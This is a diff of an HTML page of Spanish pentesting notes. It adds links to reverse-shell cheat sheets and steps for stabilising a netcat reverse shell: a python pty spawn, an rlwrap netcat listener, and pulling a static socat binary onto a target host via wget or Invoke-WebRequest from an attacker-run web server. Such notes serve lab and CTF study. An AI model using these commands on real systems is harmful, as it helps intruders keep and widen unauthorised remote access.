@@ -52,13 +52,14 @@
                     <li><span class="comando2">Socat</span>: la navaja suiza de la redes con asteroides.</li>
                     <li><span class="comando2">auxiliary/multi/handler</span>: modulo de metasploit.</li>
                     <li><span class="comando2">/usr/share/webshells</span>: WebShells de kali linux.</li>
-                    <li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
+                    <li><a class="enlace" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
                             target="_blank"><span class="comando1"></span>
                             Reverse Shell</span></a>: pentestmonkey.</li>
-                    <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
+                    <li><a class="enlace"
+                            href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
                             target="_blank"><span class="comando1"></span>
                             Reverse Shell Cheat Sheet</span></a>: Contiene reverse Shells.</li>
-                    <li><a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells"
+                    <li><a class="enlace" href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells"
                             target="_blank"><span class="comando1"></span>
                             SecLists</span></a>: repositorio donde tambien contiene reverse Shells.</li>
 
@@ -79,8 +80,101 @@
             </li>
             <li><span class="comando1">kill&lt;PID&gt;</span>: mata procesos.</li>
 
+            <span class="pasos">Netcat Shell Stabilisation</span>
+            <li><span class="comando1">Python</span>: pasos cuando python esta instalado de forma predeterminada.
+                <ol>
+                    <li><span class="comando2">1. Ejecutar para generar un Shell Bash</span>: <span class="comando4">
+                            python -c 'import pty;pty.spawn("/bin/bash")' </span>
+                        <ol>
+                            <li><span class="comando5">Nota: algunos targets neceistan especificar la version correcta
+                                    de Pyhon</span></li>
+                            <li><span class="comando5">Reemplazar la version de Pyhon por: Pyhon, Python2 ó
+                                    Python3</span></li>
+
+                        </ol>
+                    </li>
+                    <li><span class="comando2">2. Ejecutar para generar comando como clear</span>: <span
+                            class="comando4"> export TERM=xterm </span> </li>
+                    <li><span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>: <span
+                            class="comando4"> Ctrl + z </span> </li>
+                    <li><span class="comando2">4. Ejecutar para que se apague el echo de nuesta terminal</span>: <span
+                            class="comando4"> stty raw -echo; fg </span>
+
+                        <ol>
+                            <li><span class="comando5">Tenga en cuenta que si el Shell muere, cualquier entrada en su
+                                    propio terminal no será visible (como resultado de haber desactivado el echo del
+                                    terminal). </span></li>
+                            <li><span class="comando5">Solucion, escribir</span>: <span class="comando4">reset</span>
+                            </li>
+                        </ol>
+                    </li>
+                </ol>
+            </li>
 
 
+
+
+
+
+            <li><span class="comando1">rlwrap</span>: pasos para generar una shell, nos da acceso al historia, el
+                autocompletado de pestañas y teclas de flecha inmediatamente despues de recibir un shell, este tipo de
+                shell es mucho mas complejo y es tecnicamente particular cuando se trata de una Shell de Windows, que
+                son notoriamente dificiles de estabilizar.
+                <ol>
+                    <li><span class="comando5">Nota se debe seguir utilizando alguna estabilizacion manual si desea usar
+                            Ctrl +
+                            C dentro del shell </span> </li>
+                </ol>
+
+
+                <ol>
+                    <li><span class="comando3">1. Instalar la Shell rlwrap</span>: <span class="comando4">
+                            sudo apt install rlwrap</span>
+
+                    </li>
+                    <li><span class="comando2">2. Invocamos un oyente</span>: <span class="comando4">
+                            rlwrap nc -lvnp <port></span> </li>
+                    <li><span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>: <span
+                            class="comando4"> Ctrl + z </span> </li>
+                    <li><span class="comando2">4. Ejecutar para que se apague el echo de nuesta terminal (solo cuando el
+                            target sea Linux)</span>: <span class="comando4"> stty raw -echo; fg </span>
+
+
+                    </li>
+                </ol>
+            </li>
+
+
+
+            <li><span class="comando1">socat</span>: pasos para generar una shell mas simple, en la cual se usa para un
+                Shell netcat como trampolin hacia un Shell Socat con mas funciones
+                <ol>
+                    <li><span class="comando2">1. Montamos un servidor web en nuestra maquina</span>: <span
+                            class="comando4">
+                            python3 -m http.server 80</span>
+
+                    </li>
+                    <li><span class="comando2">2. Descargar binario compilado estatico socat</span>:
+
+                        <a class="enlace"
+                            href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"
+                            target="_blank"><span class="comando1"></span>
+                            socat static compiled binary</span></a>
+                    </li>
+                    <li><span class="comando2">3. En la maquina target, usar netcat para descargar el archivo </span>:
+                        <span class="comando4"> wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat </span>
+                        <ol>
+                            <li><span class="comando5">Nota: se puede usar curl o wget </span> </li>
+                        </ol>
+
+                    </li>
+
+                    <li><span class="comando2"> Se puede hacer lo mismo en PowerShell</span>:
+                        <span class="comando4"> Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile
+                            C:\\Windows\temp\socat.exe </span>
+                     </li>
+                </ol>
+            </li>
 
 
 
